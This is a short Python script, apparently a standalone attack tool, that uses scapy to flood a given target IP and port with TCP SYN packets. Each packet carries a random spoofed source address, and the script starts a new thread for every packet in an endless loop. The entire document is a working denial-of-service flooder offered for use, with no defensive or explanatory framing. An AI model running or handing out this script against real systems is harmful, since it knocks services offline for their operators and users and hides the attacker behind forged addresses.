#!/usr/bin/python

import socket, random, sys, threading
from scapy.all import *

if len(sys.argv) != 4:
    print("Arguments are <Target IP> <Target Port> <Out Interface>")
    sys.exit(1)
# sent: syn packets sent, ip: IP target, port: target port, conf.iface: interface facing target
sent = 0
ip = sys.argv[1]
port = int(sys.argv[2])
conf.iface = sys.argv[3]

class synPacket(threading.Thread):

    def __init__(self):
        threading.Thread.__init__(self)
    def run(self):
        # create IP header
        i = IP()
        # set source IP to random values
        i.src = '%i.%i.%i.%i' % (random.randint(1, 254), random.randint(1, 254), random.randint(1, 254), random.randint(1, 254))
        # set dest IP to target
        i.dst = ip

        # create TCP header
        t = TCP()
        # set random source port
        t.sport = random.randint(1, 60000)
        # set target dest port
        t.dport = port
        # set S flag to denote SYN message
        t.flags = 'S'

        # send custom packet using our i and t custom headers
        send(i/t, verbose=0)

while 1:
    sent += 1
    print(sent)
    # create instance and run
    synPacket().start()

sys.exit(0)



